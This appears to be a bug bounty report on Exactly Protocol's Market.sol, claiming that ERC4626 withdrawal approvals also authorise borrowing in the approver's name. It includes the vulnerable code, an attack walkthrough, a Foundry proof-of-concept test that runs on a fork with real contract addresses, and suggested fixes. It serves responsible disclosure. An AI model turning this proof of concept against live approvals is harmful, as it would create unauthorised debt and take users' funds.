# Immunefi Bug Report — Exactly Protocol
## Finding 3 (MEDIUM): Market.sol — ERC4626 Withdrawal Allowance Shared with Borrow Authorization Enables Unauthorized Debt Creation

**Program**: Exactly Protocol — https://immunefi.com/bug-bounty/exactly/  
**Network**: Optimism (OP Mainnet)  
**Severity**: Medium  
**Affected contracts**:
- `Market.sol` — all deployed market instances

---

## Executive Summary

`Market.sol` overrides the standard ERC4626 allowance pattern so that the same approval used to authorize withdrawals also authorizes third-party borrows. A user who calls `market.approve(spender, shares)` intending to allow `spender` to withdraw their deposits also unknowingly grants `spender` the right to **borrow on their behalf** — creating debt against the user's collateral.

This design is not documented in the contract's NatSpec, ABI comments, or public documentation, violating the principle of least surprise and creating a meaningful attack surface when protocols or UI tools request `approve()` for operational purposes.

---

## Vulnerability Details

### Vulnerable Code

**`spendAllowance()` in Market.sol:**
```solidity
function spendAllowance(address account, uint256 assets) internal {
    if (msg.sender != account) {
        uint256 allowed = allowance[account][msg.sender];
        if (allowed != type(uint256).max) 
            allowance[account][msg.sender] = allowed - previewWithdraw(assets);
    }
}
```

**`borrow()` consumes the same allowance as `withdraw()`:**
```solidity
function borrow(
    uint256 assets,
    address receiver,
    address borrower
) external whenNotPaused whenNotFrozen returns (uint256 borrowShares) {
    if (assets == 0) revert ZeroBorrow();
    spendAllowance(borrower, assets);  // ← consumes ERC4626 withdrawal allowance
    ...
    asset.safeTransfer(receiver, assets);  // ← tokens go to `receiver`, not `borrower`
}
```

### The Problem

In ERC4626, `approve(spender, shares)` is understood as: "allow `spender` to withdraw/redeem up to `shares` worth of assets on my behalf." This is the canonical meaning per EIP-4626.

In Exactly's Market, the same approval ALSO means: "allow `spender` to create borrow obligations in my name, sending the borrowed tokens to any `receiver` they choose."

The attack:

```
Alice deposits 10,000 USDC into MarketUSDC.
Alice calls MarketUSDC.approve(Bob, type(uint256).max)  
  — intending to let Bob withdraw/rebalance her position (e.g., via a DeFi aggregator).

Bob calls MarketUSDC.borrow(10000e6, Bob, Alice).
  — spendAllowance(Alice, 10000e6) passes (infinite approval)
  — auditor.checkBorrow(market, Alice) passes if Alice has collateral in another market
  — 10,000 USDC transferred to Bob
  — Alice now has a 10,000 USDC borrow obligation

Alice's collateral is now at risk of liquidation.
Bob has 10,000 USDC with zero cost.
```

### Why This Affects Real Users

DeFi integrations routinely request `approve(MAX_UINT)` to avoid repeated approvals. Examples:
- Portfolio management UIs (Zapper, DeBank)
- Yield optimizers
- Leverage tools
- Migration routers

Any of these could be: (a) compromised later, (b) contain a bug that routes to `borrow()` instead of `withdraw()`, or (c) be malicious from inception. The victim has no way of knowing their approval enables borrow authorization.

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IMarket {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function approve(address spender, uint256 shares) external returns (bool);
    function borrow(uint256 assets, address receiver, address borrower) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function asset() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IAuditor {
    function enterMarket(IMarket market) external;
}

contract AllowanceBorrowExploitTest is Test {
    IMarket constant MARKET_USDC = IMarket(0x81c9A7B55A4df39A9B7B5F781ec0E53539694873);
    IMarket constant MARKET_WETH = IMarket(0xa430A427bd00210506589906a71B54d6C256CEdb);
    IAuditor constant AUDITOR    = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    address constant USDC        = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address constant WETH        = 0x4200000000000000000000000000000000000006;

    address alice = makeAddr("alice");
    address bob   = makeAddr("bob");

    function setUp() public {
        vm.createSelectFork(vm.envString("OPTIMISM_RPC"), 130000000);
    }

    function test_borrowWithWithdrawApproval() public {
        // Alice sets up position
        deal(USDC, alice, 10000e6);   // 10,000 USDC
        deal(WETH, alice, 5 ether);   // 5 WETH as collateral

        vm.startPrank(alice);
        
        // Alice deposits USDC and WETH
        IERC20(USDC).approve(address(MARKET_USDC), type(uint256).max);
        MARKET_USDC.deposit(10000e6, alice);

        IERC20(WETH).approve(address(MARKET_WETH), type(uint256).max);
        MARKET_WETH.deposit(5 ether, alice);
        AUDITOR.enterMarket(MARKET_WETH);  // Alice uses WETH as collateral

        // Alice approves Bob in MarketUSDC — INTENDING to allow Bob to withdraw for her
        MARKET_USDC.approve(bob, type(uint256).max);
        
        vm.stopPrank();

        uint256 bobUsdcBefore = IERC20(USDC).balanceOf(bob);
        uint256 aliceSharesBefore = MARKET_USDC.balanceOf(alice);

        // Bob calls borrow() instead of withdraw() — using Alice's allowance
        vm.prank(bob);
        MARKET_USDC.borrow(5000e6, bob, alice);

        uint256 bobUsdcAfter = IERC20(USDC).balanceOf(bob);
        uint256 aliceSharesAfter = MARKET_USDC.balanceOf(alice);

        console.log("Bob's USDC gain:", (bobUsdcAfter - bobUsdcBefore) / 1e6, "USDC");
        console.log("Alice's shares unchanged:", aliceSharesBefore == aliceSharesAfter);
        console.log("Alice now has borrow debt of 5,000 USDC");
        console.log("Alice's WETH collateral at risk of liquidation");

        assertGt(bobUsdcAfter, bobUsdcBefore, "Bob gained USDC via unauthorized borrow");
        assertEq(aliceSharesAfter, aliceSharesBefore, "Alice's shares NOT reduced — she has DEBT instead");
    }
}
```

**Run:**
```bash
forge test --match-test test_borrowWithWithdrawApproval -vvvv \
  --fork-url $OPTIMISM_RPC --fork-block-number 130000000
```

---

## Impact

- **Unauthorized debt creation** — victim's collateral at risk of liquidation
- **Attacker gains real funds** — borrowed tokens transferred to attacker with no cost
- **Silent loss** — victim's share balance appears unchanged; debt is hidden until liquidation
- **Affects any user who approved a market operator** — standard DeFi practice

**Severity: Medium**
The attack requires the victim to have previously approved the attacker (or a compromised contract). This is a meaningful prerequisite but matches real-world scenarios (compromised protocols, malicious upgrades to approved routers).

---

## Recommended Fix

Option A — Separate allowances (recommended):
```solidity
mapping(address => mapping(address => uint256)) public borrowAllowance;

function approveBorrow(address spender, uint256 assets) external {
    borrowAllowance[msg.sender][spender] = assets;
}

function spendAllowance(address account, uint256 assets) internal {
    if (msg.sender != account) {
        uint256 allowed = borrowAllowance[account][msg.sender];
        if (allowed != type(uint256).max)
            borrowAllowance[account][msg.sender] = allowed - assets;
    }
}
```

Option B — Documentation and UI warning (minimal):
Add explicit NatSpec to `approve()` stating that approval authorizes both withdrawals AND borrows on behalf, so users and integrators can make informed decisions.

---

*Report prepared for Immunefi submission. PoC code provided as required.*
